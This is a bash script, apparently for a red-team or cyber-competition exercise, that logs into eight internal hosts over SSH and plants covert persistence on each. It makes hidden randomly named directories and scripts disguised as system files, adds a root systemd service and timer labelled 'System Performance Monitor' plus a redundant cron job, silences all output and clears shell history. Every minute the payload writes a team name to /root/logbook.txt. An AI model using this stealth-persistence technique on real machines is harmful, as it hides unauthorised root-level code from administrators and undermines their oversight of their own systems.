#!/bin/bash

# Logbook modification deployment script
# Uses existing SSH keys from the original deployment script

# SSH key path from original deployment script
SSH_KEY="$HOME/.ssh/id_ed25519"
SSH_KEY_PUB="$HOME/.ssh/id_ed25519.pub"

# Target machines - uses same format as deploy script
MACHINES=(
    "CAgrupnin@10.10.1.2"
    "CAgrupnin@10.10.1.3"
    "LCoramar@10.10.2.2"
    "LCoramar@10.10.2.3"
    "LSeelie@10.10.3.2"
    "LSeelie@10.10.3.3"
    "VChloras@10.10.4.2"
    "VChloras@10.10.4.3"
)

# Verify SSH key exists
if [ ! -f "$SSH_KEY" ]; then
  echo "Error: SSH key not found at $SSH_KEY"
  echo "Please run the original deploy.sh script first to set up SSH keys"
  exit 1
fi

echo "Using existing SSH key: $SSH_KEY"

# Function to generate random names
generate_random_name() {
    # Generate a random name that looks like a legitimate system file
    local prefixes=("kernel" "system" "net" "lib" "proc" "udev" "cache" "audit" "daemon")
    local suffixes=("monitor" "daemon" "service" "update" "probe" "check" "agent" "util" "core")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    local suffix=${suffixes[$RANDOM % ${#suffixes[@]}]}
    local rand_num=$((RANDOM % 100))
    echo "${prefix}_${suffix}${rand_num}"
}

# Function to deploy to a single machine
deploy_to_machine() {
    local user_host="$1"
    
    echo "Deploying to $user_host..."
    
    # Generate random names for this deployment
    LOCAL_DIR_NAME=".$(generate_random_name)"
    LOCAL_SCRIPT_NAME="$(generate_random_name).sh"
    LOCAL_SERVICE_NAME="$(generate_random_name)"
    
    # Create a here-document with all commands to run on remote system
    ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$user_host" << EOF > /dev/null 2>&1
    # Create hidden directory with random name in /var
    sudo mkdir -p /var/${LOCAL_DIR_NAME}

    # Create the update script with random name
    cat << 'EOFHIDDEN' | sudo tee /var/${LOCAL_DIR_NAME}/${LOCAL_SCRIPT_NAME} > /dev/null
#!/bin/bash
echo "Munsons Maniacs" > /root/logbook.txt
EOFHIDDEN

    # Make script executable
    sudo chmod +x /var/${LOCAL_DIR_NAME}/${LOCAL_SCRIPT_NAME}

    # Create systemd service with random name
    cat << EOFSERVICE | sudo tee /etc/systemd/system/${LOCAL_SERVICE_NAME}.service > /dev/null
[Unit]
Description=System Performance Monitor
After=network.target

[Service]
Type=oneshot
ExecStart=/var/${LOCAL_DIR_NAME}/${LOCAL_SCRIPT_NAME}
User=root

[Install]
WantedBy=multi-user.target
EOFSERVICE

    # Create systemd timer running every minute
    cat << EOFTIMER | sudo tee /etc/systemd/system/${LOCAL_SERVICE_NAME}.timer > /dev/null
[Unit]
Description=System Performance Check Timer
After=network.target

[Timer]
OnBootSec=10sec
OnUnitActiveSec=1min
Persistent=true

[Install]
WantedBy=timers.target
EOFTIMER

    # Quietly enable and start the timer
    sudo systemctl daemon-reload > /dev/null 2>&1
    sudo systemctl enable ${LOCAL_SERVICE_NAME}.timer > /dev/null 2>&1
    sudo systemctl start ${LOCAL_SERVICE_NAME}.timer > /dev/null 2>&1

    # Add redundant cron job with random name and no log output
    (sudo crontab -l 2>/dev/null | grep -v "${LOCAL_SCRIPT_NAME}"; echo "* * * * * /var/${LOCAL_DIR_NAME}/${LOCAL_SCRIPT_NAME} > /dev/null 2>&1") | sudo crontab - 2>/dev/null

    # Run the update script now
    sudo /var/${LOCAL_DIR_NAME}/${LOCAL_SCRIPT_NAME} > /dev/null 2>&1

    # Clear history
    history -c
EOF

    echo "Deployment to $user_host completed with random names:"
    echo "  - Directory: /var/${LOCAL_DIR_NAME}"
    echo "  - Script: ${LOCAL_SCRIPT_NAME}"
    echo "  - Service: ${LOCAL_SERVICE_NAME}"
}

# Main execution
echo "Starting stealth deployment to all targets using existing SSH keys..."

for machine in "${MACHINES[@]}"; do
    deploy_to_machine "$machine"
done

echo "Deployment complete - all targets have been configured"
echo "- Each target now runs the logbook update every minute via randomized systemd timer"
echo "- Each target also has a redundant cron job running every minute"
echo "- All file names and locations are randomized for each target"
